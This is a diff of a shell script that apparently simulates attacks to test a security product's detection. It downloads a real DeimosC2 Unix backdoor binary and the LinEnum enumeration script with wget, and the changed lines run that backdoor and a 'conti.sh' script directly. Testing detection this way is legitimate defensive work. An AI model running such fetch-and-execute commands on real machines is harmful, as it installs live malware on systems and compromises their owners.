@@ -23,7 +23,6 @@ apk add --no-cache clang llvm
 # SCENARIO 1 --- Script Activity / Linux Enumeration 
 # Outcome: Detect suspicious script activity
 echo "Scenario 1 - Smart Enumeration Script Activity"
-
 echo "[+] Downloading enumeration script using wget..."
 wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O enum_script.sh
 chmod +x enum_script.sh
@@ -40,7 +39,6 @@ sleep 3
 # SCENARIO 2 --- Local Malware 
 # Outcome: download and prompt local malware analysis 
 echo "Scenario 2 - Malware Protection - Wildfire Analysis"
-
 echo "[+] Downloading Unix backdoor script"
 wget https://raw.githubusercontent.com/timb-machine/linux-malware/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64
 chmod +x 05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64
@@ -71,8 +69,8 @@ echo "[+] Changing C2 Client file permissions to executable"
 chmod +x c2.sh
 sleep 3
 
-
 # SCENARIO  3 --- MITRE ATT&CK TTP Demonstration Script
+echo "[+] Senario 3 MITTRE ATTACK TTP"
 # === Initial Access and Execution ===
 echo "[*] Attempting SSH Access..."
 ssh user@localhost || echo "[!] SSH failed - Continuing..."
@@ -158,8 +156,8 @@ chmod +x deepce.sh
 echo "[+] Calling malware executables"
 #[TODO] Error handeling in this - nil pointer reference in go library # Execution of Malware (suppress errors with `|| true`)
 #./05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 || true 
-sh conti.sh || true 
-05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64
+./conti.sh || true 
+./05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64
 #./c2.sh || true 
 
 
